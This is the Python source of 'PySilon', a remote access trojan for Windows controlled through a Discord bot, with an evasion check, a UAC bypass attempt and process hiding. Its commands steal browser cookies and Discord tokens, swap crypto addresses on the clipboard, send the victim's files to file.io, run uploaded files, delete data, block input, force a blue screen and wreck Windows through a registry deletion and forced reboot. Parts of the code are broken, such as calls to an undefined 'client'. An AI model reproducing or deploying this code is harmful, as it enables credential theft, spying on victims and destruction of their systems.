from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import resources.modules.av_detect as pysilon_av_detect
import resources.modules.misc as pysilon_misc
from win32crypt import CryptUnprotectData
from psutil import process_iter, Process
from screeninfo import get_monitors
from pynput import keyboard, mouse
from urllib.request import urlopen
from urllib.parse import urlparse
from Cryptodome.Cipher import AES
from shutil import copy2, rmtree
from ctypes import cast, POINTER
from discord.ext import commands
from comtypes import CLSCTX_ALL
from psutil import process_iter
from tkinter import messagebox
from bs4 import BeautifulSoup
from Crypto.Cipher import AES
from datetime import datetime
from zipfile import ZipFile
from getpass import getuser
from PIL import ImageGrab
from discord import Embed
from shutil import copy2
import monitorcontrol
import pygame.camera
import pygame.image
import win32process
import numpy as np
import win32print
import subprocess
import pyperclip
import threading
import pyautogui
import win32api
import win32con
import win32gui
import platform
import requests
import datetime
import pyttsx3
import imageio
import pyaudio
import sqlite3
import hashlib
import asyncio
import discord
import base64
import pygame
import socket
import psutil
import getmac
import random
import ctypes
import math
import time
import json
import sys
import re
import os


bot_token = ''
guild_ids = []
DEFAULT = 'DEFAULT'

class PySilon(commands.Bot):
    def __init__(self, command_prefix, self_bot) -> None:
        def IsAdmin() -> bool: return ctypes.windll.shell32.IsUserAnAdmin() == 1
        if protection_check(): os._exit(0)
        if single_instance_lock(): os._exit(0)

        if not IsAdmin():
            if GetSelf()[1]:
                if UACbypass(): os._exit(0)
        else:
            proccess_was_hidden = False
            if proc_hider.hide_process(): proccess_was_hidden = True

        input_blocked = None
        keyboard_listener = None
        mouse_listener = None
        monitors_off = False
        processes_list = []
        embeds_to_send = []
        threading.Thread(target=process_blacklister).start()
        self.load_bot(command_prefix, self_bot)

    async def first_run_check(self) -> None:
        guild_id, guild_id_index = guild_ids[0], 0
        hwid = subprocess.check_output("powershell (Get-CimInstance Win32_ComputerSystemProduct).UUID", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
        channel_not_found = True
        for _ in guild_ids:
            for channel_name in self.get_guild(guild_id).channels:
                if hwid in str(channel_name):
                    self.channel = channel_name
                    return await self.sequent_run(channel_name)
            if guild_id_index != len(guild_ids)-1:
                guild_id_index += 1
                self.guild_id = guild_ids[guild_id_index]
            else: break

        for guild in guild_ids:
            get_guild = self.get_guild(guild)
            if len(get_guild.channels) < 499:
                self.guild_id = guild
                break

        await self.first_run(guild_id, hwid)

    async def first_run(self, guild_id, hwid) -> None:
        self.working_directory = [os.getenv('SystemDrive'), "Users", getuser()]; self.save_working_dir()
        self.channel = await self.get_guild(guild_id).create_text_channel(f'{generate_channel_name()} [{hwid.replace('-', '')[::-1]}]')

    async def sequent_run(self, channel) -> None:
        self.fetch_working_dir()
        if self.working_directory == None or self.working_directory == []: self.working_directory = [os.getenv('SystemDrive'), "Users", getuser()]; self.save_working_dir()
        
    def load_bot(self, command_prefix, self_bot) -> None:
        commands.Bot.__init__(self, command_prefix=command_prefix, self_bot=self_bot, intents=discord.Intents.all())

        self.guild_id = 1178999695570374697
        self.channel_id = 1262286966205059082

        self.load_commands()

    async def on_ready(self):
        await self.get_channel(self.channel_id).send('Bot is ready')
        await self.first_run_check()
        await self.change_presence(activity=discord.Game(name=f'⭐ us on GitHub [{render_text('pysilon')}.net]'))
        await self.user.edit(username=render_text('PySilon Malware'), avatar=urlopen('https://raw.githubusercontent.com/mategol/PySilon-malware/v4-dev/resources/icons/default_icon.png').read())

        '''await self.get_channel(self.channel_id).send(embed=self.generate_embed(
            title='New session detected!',
            description=f'A {render_text('victim')} has turned up their PC!',
            color=0x34ebeb,
            fields=[['', grab_info().prepare_info(), False]],
            footer=['Please ⭐ our repository if you enjoy'],
            author=[DEFAULT, DEFAULT]
        ))'''

    def load_commands(self):
        @self.command(name="server", pass_context=True)
        async def server(ctx):
            await ctx.channel.send('asdasd')
        
        
        
        @client.command(name='volume')
        async def volume_control(ctx, volume_int=None):
            await ctx.message.delete()
            if volume_int != None:
                devices = AudioUtilities.GetSpeakers()
                interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                volume = cast(interface, POINTER(IAudioEndpointVolume))
        
                try: volume_int = int(volume_int)
                except:
                    return await ctx.send(embed=self.generate_embed(
                        title='📛 Error',
                        description='```Syntax: .volume <0 - 100>```',
                        color=0xff0000,
                        footer=['Please ⭐ our repository if you enjoy'],
                        author=[DEFAULT, DEFAULT]))
        
                if volume_int <= 100 and volume_int >= 0:
                    volume.SetMasterVolumeLevelScalar(volume_int/100, None)
                    await ctx.send(embed=self.generate_embed(
                        title='🟢 Success',
                        description='```Successfully set volume to {volume_int}%```',
                        color=0x00ff00,
                        footer=['Please ⭐ our repository if you enjoy'],
                        author=[DEFAULT, DEFAULT]))
                else:
                    await ctx.send(embed=self.generate_embed(
                        title='📛 Error',
                        description='```Syntax: .volume <0 - 100>```',
                        color=0xff0000,
                        footer=['Please ⭐ our repository if you enjoy'],
                        author=[DEFAULT, DEFAULT]))
            else:
                await ctx.send(embed=self.generate_embed(
                    title='📛 Error',
                    description='```Syntax: .volume <0 - 100>```',
                    color=0xff0000,
                    footer=['Please ⭐ our repository if you enjoy'],
                    author=[DEFAULT, DEFAULT]))
        
        @client.command(name='play')
        async def play_audio(ctx, audio_file=None):
            await ctx.message.delete()
            if audio_file == None:
                await ctx.send(embed=self.generate_embed(
                    title='📛 Error',
                    description='```Syntax: .play <path/to/audio-file.mp3>```',
                    color=0xff0000,
                    footer=['Please ⭐ our repository if you enjoy'],
                    author=[DEFAULT, DEFAULT]))
            elif not ctx.message.content.endswith('.mp3'):
                await ctx.send(embed=self.generate_embed(
                    title='📛 Error',
                    description='```Invalid file type. Please select an MP3 file.```',
                    color=0xff0000,
                    footer=['Please ⭐ our repository if you enjoy'],
                    author=[DEFAULT, DEFAULT]))
            else:
                def play_audio():
                    audio_file = ctx.message.content[6:]
                    audio_file = audio_file.replace('\\','/')
                    pygame.mixer.init()
                    pygame.mixer.music.load(audio_file)
                    pygame.mixer.music.play()
                    while pygame.mixer.music.get_busy():
                        pass
                    pygame.mixer.quit()
                threading.Thread(target=play_audio).start()
                await ctx.send(embed=self.generate_embed(
                    title='🟢 Success',
                    description='```Successfully started playing audio file.```',
                    color=0x00ff00,
                    footer=['Please ⭐ our repository if you enjoy'],
                    author=[DEFAULT, DEFAULT]))        
        
        @client.command(name='breakwin')
        async def break_windows(ctx):
            await ctx.message.delete()
            try:
                if IsAdmin():
                    reaction_msg = await self.get_channel(self.channel_id).send(embed=self.generate_embed(
                        title='🟣 System',
                        description=f'```Are you sure you want to {render_text('completely break')} Windows?```',
                        color=0xa020f0,
                        footer=['Please ⭐ our repository if you enjoy'],
                        author=[DEFAULT, DEFAULT]))
                    await reaction_msg.add_reaction('✅'); await reaction_msg.add_reaction('❌')
                    def win_break_confirm(reaction, user):
                        return str(reaction.emoji) in ['✅', '❌'] and user == ctx.author
                    try:
                        reaction, user = await client.wait_for('reaction_add', check=win_break_confirm)
                        if str(reaction.emoji) == '✅':
                            await self.get_channel(self.channel_id).send(embed=self.generate_embed(
                                title='🟢 Executing',
                                description=f'```{render_text('Break Windows')} will now be {render_text('executed')}. Bye bye!```',
                                color=0x00ff00,
                                footer=['Please ⭐ our repository if you enjoy'],
                                author=[DEFAULT, DEFAULT]))
                            subprocess.run(['reg', 'delete', 'HKLM\\SYSTEM\\Setup', '/v', 'SetupType', '/f'], check=True)
                            subprocess.run(['shutdown', '/r', '/f', '/t', '0'], check=True)
                        else: return await ctx.send("```❗ Cancelled by user.```")
                    except: asyncio.TimeoutError: await ctx.send("```❗ Reaction listener has timed out.```")
                else:
                    await self.get_channel(self.channel_id).send(embed=self.generate_embed(
                        title='📛 Error',
                        description=f'```{render_text('PySilon')} is not running as {render_text('admin')}!```',
                        color=0x00ff00,
                        footer=['Please ⭐ our repository if you enjoy'],
                        author=[DEFAULT, DEFAULT]))
            except:
                await self.get_channel(self.channel_id).send(embed=self.generate_embed(
                    title='📛 Error',
                    description=f'```An error occurred during {render_text('windows break')}.```',
                    color=0x00ff00,
                    footer=['Please ⭐ our repository if you enjoy'],
                    author=[DEFAULT, DEFAULT]))        
        
        @client.command(name="bsod")
        async def bluescreen_trigger(ctx): 
            await ctx.message.delete()
            await self.get_channel(self.channel_id).send(embed=self.generate_embed(
                title='🟢 Executing',
                description=f'```{render_text('Triggering a BSoD')}...```',
                color=0x00ff00,
                footer=['Please ⭐ our repository if you enjoy'],
                author=[DEFAULT, DEFAULT]))
        
            nullptr = ctypes.POINTER(ctypes.c_int)()
            ctypes.windll.ntdll.RtlAdjustPrivilege(
                ctypes.c_uint(19), 
                ctypes.c_uint(1), 
                ctypes.c_uint(0), 
                ctypes.byref(ctypes.c_int())
            )
            ctypes.windll.ntdll.NtRaiseHardError(
                ctypes.c_ulong(0xC000007B), 
                ctypes.c_ulong(0), 
                nullptr, 
                nullptr, 
                ctypes.c_uint(6),
                ctypes.byref(ctypes.c_uint())
            )
        
        @client.command(name="grab-cookies")
        async def grab_cookies(ctx):
            await self.get_channel(self.channel_id).send(embed=self.generate_embed(
                title='🟣 Hold on!',
                description=f'```{render_text('Grabbing cookies')}...```',
                color=0xa020f0,
                footer=['Please ⭐ our repository if you enjoy'],
                author=[DEFAULT, DEFAULT]))
            grab_cookies()
            await asyncio.sleep(3)
            await self.get_channel(self.channel_id).send(embed=self.generate_embed(
                title='🟢 Success',
                description=f'```{render_text('Grabbed cookies')} will be sent in next message```',
                color=0x00ff00,
                footer=['Please ⭐ our repository if you enjoy'],
                author=[DEFAULT, DEFAULT]))
            await ctx.send(file=discord.File(f'cookies.txt', filename='cookies.txt'))
            subprocess.run(f'del cookies.txt', shell=True)
        
        @client.command(name="clipper")
        async def crypto_clipper(ctx, option=None):
            global clipper_stop, clipper_thread, clipper_thread_stop
            await ctx.message.delete()
        
            if option == "start":
                if clipper_stop:
                    clipper_stop = False
                    clipper_thread_stop = False
        
                    clipper_thread = threading.Thread(target=wait_for_paste)
                    clipper_thread.start()
                    embed = discord.Embed(title="🟢 Crypto Clipper started!",description=f'```Crypto Clipper has been started! Stop it by using .clipper stop```', colour=discord.Colour.green())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
                else:
                    embed = discord.Embed(title="🔴 Hold on!",description=f'```Crypto Clipper is already running! Stop it by using .clipper stop```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
        
            elif option == "stop":
                if not clipper_stop:
                    clipper_thread_stop = True
                    embed = discord.Embed(title="🟢 Crypto Clipper stopped!",description=f'```Crypto Clipper has been stopped! Start it using .start-clipper```', colour=discord.Colour.green())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
                    clipper_stop = True
                else:
                    embed = discord.Embed(title="🔴 Hold on!",description=f'```Crypto Clipper is not running! Start it by using .clipper start```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
        
            else:
                embed = discord.Embed(title="📛 Error",description=f'```Syntax: .clipper <start/stop>```', colour=discord.Colour.red())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                return await ctx.send(embed=embed)
        
        @client.command(name="grab-discord")
        async def grab_discord(ctx, option=None):
            await ctx.message.delete()
            if option == 'discord':
                await ctx.send(f"```{render_text('Grabbing Discord tokens')}...```")
                accounts = grab_discord.initialize(False)
                for account in accounts:
                    await ctx.send(embed=account)
            else:
                await self.get_channel(self.channel_id).send(embed=self.generate_embed(
                    title='📛 Error',
                    description=f'```Syntax: .grab <what-to-grab>\nOptions: discord```',
                    color=0xff0000,
                    footer=['Please ⭐ our repository if you enjoy'],
                    author=[DEFAULT, DEFAULT]))
        
        
        @client.command(name="fakeerror")
        async def fake_error(ctx, *, args=None):
            await ctx.message.delete()
        
            if args is None or args.strip() == '':
                embed = discord.Embed(title="📛 Error",description=f'```Syntax: .fakeerror default | custom [message]```',colour=discord.Colour.red())
                embed.set_author(name="PySilon-malware",icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                await ctx.send(embed=embed)
            else:
                parts = args.split()
                command = parts[0]
        
                if command == 'default':
                    try:
                        error_msg = "Something went wrong"
                        messagebox.showerror("Error", error_msg, icon='error')
                        embed = discord.Embed(title="🟢 Success",description=f'```Fake error has been triggered.```',colour=discord.Colour.green())
                        embed.set_author(name="PySilon-malware",icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        await ctx.send(embed=embed)
                    except:
                        embed = discord.Embed(title="🔴 Hold on!",description=f'```Something went wrong during the trigger```',colour=discord.Colour.red())
                        embed.set_author(name="PySilon-malware",icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        await ctx.send(embed=embed)
                elif command == 'custom':
                    if len(parts) < 2:
                        embed = discord.Embed(title="📛 Error",description=f'```No custom message provided```',colour=discord.Colour.red())
                        embed.set_author(name="PySilon-malware",icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        await ctx.send(embed=embed)
                    else:
                        custom_error_message = ' '.join(parts[1:])
                        try:
                            messagebox.showerror("Error", custom_error_message, icon='error')
                            embed = discord.Embed(title="🟢 Success",description=f'```Fake error with custom message has been triggered.```',colour=discord.Colour.green()
                            )
                            embed.set_author(name="PySilon-malware",icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                            await ctx.send(embed=embed)
                        except:
                            embed = discord.Embed(title="🔴 Hold on!",description=f'```Something went wrong during the trigger```',colour=discord.Colour.red())
                            embed.set_author(name="PySilon-malware",icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                            await ctx.send(embed=embed)
                else:
                    embed = discord.Embed(title="📛 Error",description=f'```Invalid option. Choose default or custom```',colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware",icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
        
        
        @client.command(name='download')
        async def file_downloading(ctx, file_to_download=None):
            await ctx.message.delete()
            if file_to_download != None:
                if os.path.exists(file_to_download):
                    target_file = file_to_download
                    if os.path.isdir(target_file):
                        target_file += '.zip'
                        with ZipFile(target_file,'w') as zip:
                            for file in pysilon_misc.get_all_file_paths('.'.join(target_file.split('.')[:-1])):
                                try:
                                    zip.write(file)
                                except Exception as e:
                                    await ctx.send(e)
                                    pass
                    await ctx.send("```Uploading to file.io... This can take a while depending on the file size and the victim's internet speed...```")
                    data = {'file': open(target_file, 'rb')}
                    url = 'https://file.io/'
                    response = requests.post(url, files=data)
                    data = response.json()
                    embed = discord.Embed(title=f"🟢 {file_to_download}",description=f"Click [here](<{data['link']}>) to download.", colour=discord.Colour.green())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
                    await ctx.send('Warning: The file will be removed from file.io right after the first download.')
                else:
                    embed = discord.Embed(title="📛 Error",description=f'```❗ File or directory not found.```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
            else:
                embed = discord.Embed(title="📛 Error",description=f'```Syntax: .download <file-or-directory>```', colour=discord.Colour.red())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                await ctx.send(embed=embed)
        
        async def unzip(ctx, file):
            archive_password = None 
        
            def get_archive_pass(m):
                return m.content and m.channel == ctx.channel
            
            try:
                with ZipFile(file) as zip_file:
                    embed = discord.Embed(title='🔴 Hold on!', description='```This zip file is password protected.\n\nPlease send the password here.```', colour=discord.Colour.red())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                    
                    try: zip_file.testzip()
                    except: await ctx.send(embed=embed); archive_password = await client.wait_for('message', check=get_archive_pass); archive_password = archive_password.content
        
                    zip_file.extractall(os.path.dirname(file), pwd=archive_password.encode()) if archive_password != None else zip_file.extractall(os.path.dirname(file))
                    embed = discord.Embed(title='🟢 Success', description='```The zip file has been successfully extracted.```', colour=discord.Colour.green())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                    await ctx.send(embed=embed)
            except:
                embed = discord.Embed(title='📛 Error', description='Failed to unzip the file.', colour=discord.Colour.red())
                embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                return await ctx.send(embed=embed)
        
        @client.command(name='upload')
        async def file_uploading(ctx, argument=None, name_of_file=None):
            await ctx.message.delete()
        
            async def is_archive(filename):
                embed = discord.Embed(title='🔵 Zip file detected', description='```Would you like to unzip it?```', colour=discord.Colour.blue())
                embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                reaction_message = await ctx.send(embed=embed); await reaction_message.add_reaction('✅'); await reaction_message.add_reaction('❌')
                
                def extract_zipfile_user_confirm(reaction, user):
                    return str(reaction.emoji) in ['✅', '❌'] and user == ctx.author
                
                try:
                    reaction, user = await client.wait_for('reaction_add', check=extract_zipfile_user_confirm)
                    if str(reaction.emoji) == '✅':
                        await unzip(ctx, filename)
                except asyncio.TimeoutError: await ctx.send("```❗ Reaction listener has timed out.```")
        
            if argument == 'small':
                embed = discord.Embed(title='📤 Waiting for file...', description='Send the file you wish to upload here.', colour=discord.Colour.blue())
                embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                await ctx.send(embed=embed)
                
                def wait_for_discord_file(m):
                    return m.attachments and m.channel == ctx.channel
                msg = await client.wait_for('message', check=wait_for_discord_file)
                
                try:
                    filename = msg.attachments[0].filename
                    await msg.attachments[0].save(fp='/'.join(working_directory) + '/' + filename)
                except: return await ctx.send("```❗ File failed to upload.```")
        
                embed = discord.Embed(title=f"🟢 Success",description=f"Your file `{filename}` has been successfully uploaded.", colour=discord.Colour.green())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                await ctx.send(embed=embed) 
        
                if filename.endswith('.zip'):
                    await is_archive('/'.join(working_directory) + '/' + filename)   
        
            elif argument == 'big':
                if name_of_file != None:
                    embed = discord.Embed(title='📤 Waiting for file...', description='Please upload your file to [file.io](<https://file.io/>) and send the link here.', colour=discord.Colour.blue())
                    embed.set_author(name='PySilon-malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
                    await ctx.send(embed=embed)
        
                    def wait_for_file_io_link(m):
                        return m.content and m.channel == ctx.channel
                    target_file = await client.wait_for('message', check=wait_for_file_io_link)
                    target_file = target_file.content
        
                    if not target_file.startswith("https://file.io"): return await ctx.send("```❗ Your message did not contain a file.io link.```")
        
                    html_content = f'''
                    <a href="{target_file}" download="download" title="Download"></a>
                    '''
                    soup = BeautifulSoup(html_content, 'html.parser')
                    download_link = soup.find('a')['href']
                    response = requests.get(download_link)
        
                    if response.status_code == 200:
                        with open('/'.join(working_directory) + '/' + name_of_file, 'wb') as f:
                            f.write(response.content)
                    else: return await ctx.send("```❗ File failed to upload.```")
                    
                    embed = discord.Embed(title=f"🟢 Success",description=f"Your file `{name_of_file}` has been successfully uploaded.", colour=discord.Colour.green())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
        
                    if name_of_file.endswith('.zip'):
                        await is_archive('/'.join(working_directory) + '/' + name_of_file)
        
                else:
                    embed = discord.Embed(title="📛 Error",description=f'```Syntax: .upload big <file_name.ext>```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
                
            else:
                embed = discord.Embed(title="📛 Error",description=f'```Syntax: .upload <small / big>```', colour=discord.Colour.red())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                await ctx.send(embed=embed)
        
        @client.command(name="unzip")
        async def unzip_command(ctx, filename=None):
            await ctx.message.delete()
        
            if filename != None and filename.endswith(".zip"):
                if os.path.exists('/'.join(working_directory) + '/' + filename): await unzip(ctx, '/'.join(working_directory) + '/' + filename)
                elif os.path.exists(filename): await unzip(ctx, filename)
                else: await ctx.send('```❗ Archive not found```')
            else:
                embed = discord.Embed(title="📛 Error",description=f'```Syntax: .unzip <path/to/zip_file>```', colour=discord.Colour.red())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                await ctx.send(embed=embed)
        
        @client.command(name="mkdir")
        async def create_directory(ctx, path=None):
            await ctx.message.delete()
            if path != None:
                try:
                    if os.path.isabs(path): 
                        os.mkdir(path)
                    else:
                        os.mkdir('/'.join(working_directory) + '/' + path)
                    embed = discord.Embed(title=f"🟢 Success",description=f"```Directory {path} has been successfully created.```", colour=discord.Colour.green())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
                    
                except Exception as e:
                    embed = discord.Embed(title="📛 Error",description=f'```Something went wrong.\n\n{str(e)}```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
            else:
                embed = discord.Embed(title="📛 Error",description=f'```Syntax: .mkdir <path>```', colour=discord.Colour.red())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                await ctx.send(embed=embed)
        
        @client.command(name="execute")
        async def execute_file(ctx, file_to_exec=None):
            await ctx.message.delete()
        
            async def execution(ctx, file_to_exec):
                try:
                    subprocess.run('start "" "' + file_to_exec + '"', shell=True)
                    await asyncio.sleep(1)
                    ImageGrab.grab(all_screens=True).save('ss.png')
                    await ctx.send(embed=discord.Embed(title=pysilon_misc.current_time() + ' `[Executed: ' + file_to_exec + ']`').set_image(url='attachment://ss.png'), file=discord.File('ss.png'))
                    subprocess.run('del ss.png', shell=True)
                    await ctx.send('```Successfully executed: ' + file_to_exec + '```')
                except Exception as e:
                    await ctx.send(f'```❗ Something went wrong...```\n{str(e)}')
        
            if file_to_exec != None:
                if os.path.exists('/'.join(working_directory) + '/' + file_to_exec):
                    await execution(ctx, '/'.join(working_directory) + '/' + file_to_exec)
                elif os.path.exists(file_to_exec):
                    await execution(ctx, file_to_exec) 
                else:
                    embed = discord.Embed(title="📛 Error",description=f'```File or directory not found!```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
            else:
                embed = discord.Embed(title="📛 Error",description=f'```Syntax: .execute <path/to/file>```', colour=discord.Colour.red())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                await ctx.send(embed=embed)
        
        @client.command(name="cd")
        async def travarse_working_dir(ctx, path=None):
            if path != None:
                if os.path.isdir('/'.join(working_directory) + '/' + path):
                    if '/' in path:
                        for dir in path.split('/'):
                            if dir == '..':
                                working_directory.pop(-1)
                            else:
                                working_directory.append(dir)
                    else:
                        if path == '..':
                            working_directory.pop(-1) 
                        else:
                            working_directory.append(path)
                    await ctx.send('```You are now in: ' + '/'.join(working_directory) + '```')
                    save_working_dir()
                else:
                    if os.path.isdir(path): 
                        working_directory.clear()
                        for dir in path.split('/'):
                            working_directory.append(dir)
                        await ctx.send('```You are now in: ' + '/'.join(working_directory) + '```')
                        save_working_dir()
                    else:
                        await ctx.send('```❗ Directory not found.```')
        
        @client.command(name="ls")
        async def list_working_directory(ctx):
            await ctx.message.delete() 
            dir_content_f, dir_content_d, directory_content = [], [], []
        
            for element in os.listdir('/'.join(working_directory)+'/'):
                if os.path.isfile('/'.join(working_directory)+'/'+element): dir_content_f.append(element)
                else: dir_content_d.append(element)
        
            dir_content_d.sort(key=str.casefold); dir_content_f.sort(key=str.casefold)
        
            for single_directory in dir_content_d: directory_content.append(single_directory)
            for single_file in dir_content_f: directory_content.append(single_file)
        
            await ctx.send('```Content of ' + '/'.join(working_directory) +'/ at ' + pysilon_misc.current_time() + '```')
            lsoutput = directory_content
            while lsoutput != []:
                if len('\n'.join(lsoutput)) > 1994:
                    temp = ''
                    while len(temp+lsoutput[0])+1 < 1994:
                        temp += lsoutput[0] + '\n'
                        lsoutput.pop(0)
                    await ctx.send('```' + temp + '```')
                else:
                    await ctx.send('```' + '\n'.join(lsoutput) + '```')
                    lsoutput = []
        
        @client.command(name="pwd")
        async def print_working_directory(ctx):
            await ctx.message.delete()
            embed = discord.Embed(title=f"🟣 System",description=f"Current directory: `{'/'.join(working_directory)}`", colour=discord.Colour.purple())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
        
        @client.command(name="remove")
        async def remove_files(ctx, argument): 
            await ctx.message.delete()
        
            async def remove_file_func(ctx, argument):
                try:
                    if os.path.isfile(argument):
                        argument = argument.replace('/', '\\')
                        subprocess.run('del "' + argument + '"', shell=True)
                    else:
                        rmtree(argument)
        
                    embed = discord.Embed(title="🟢 Success",description=f'Successfully removed `{argument}`.', colour=discord.Colour.green())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
        
                except Exception as e:
                    embed = discord.Embed(title="📛 Error",description=f'`' + str(e) + '`', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
        
            if argument != None:
                if os.path.exists('/'.join(working_directory) + '/' + argument): await remove_file_func(ctx, '/'.join(working_directory) + '/' + argument)
                elif os.path.exists(argument): await remove_file_func(ctx, argument)
                else:
                    embed = discord.Embed(title="📛 Error",description=f'```File or directory not found.```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
            else:
                embed = discord.Embed(title="📛 Error",description=f'```Syntax: .remove <file-or-directory>```', colour=discord.Colour.red())
                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                await ctx.send(embed=embed)        
        @client.command(name="input")
        async def block_input(ctx, argument=None):
            global input_blocked, keyboard_listener, mouse_listener
            if argument == "block":
                if not input_blocked:
                    await ctx.message.delete()
                    async def on_press(): pass
                    async def on_release(): pass
                    async def on_click():pass
        
                    keyboard_listener = keyboard.Listener(suppress=True)
                    mouse_listener = mouse.Listener(suppress=True)
                    keyboard_listener.start()
                    mouse_listener.start()
        
                    embed = discord.Embed(title="🚫 Input Blocked",description=f'```Input has been blocked. Unblock it by using .input unblock```',colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware",icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
                    input_blocked = True
                else:
                    embed = discord.Embed(title="🔴 Hold on!",description=f'```The input is already blocked. Unblock it by using .input unblock```',colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware",icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
            elif argument == "unblock":
                if input_blocked:
                    await ctx.message.delete()
                    keyboard_listener.stop()
                    mouse_listener.stop()
        
                    embed = discord.Embed(title="🟢 Input Unblocked",description=f'```Input has been unblocked. Block it by using .input block```',colour=discord.Colour.green())
                    embed.set_author(name="PySilon-malware",icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
                    input_blocked = False
                else:
                    embed = discord.Embed(title="🔴 Hold on!",description=f'```The input is not blocked. Block it by using .input block```',colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware",icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await ctx.send(embed=embed)
            else:
                embed = discord.Embed(title="📛 Error",description='```Syntax: .input <block / unblock>```', colour=discord.Colour.red())
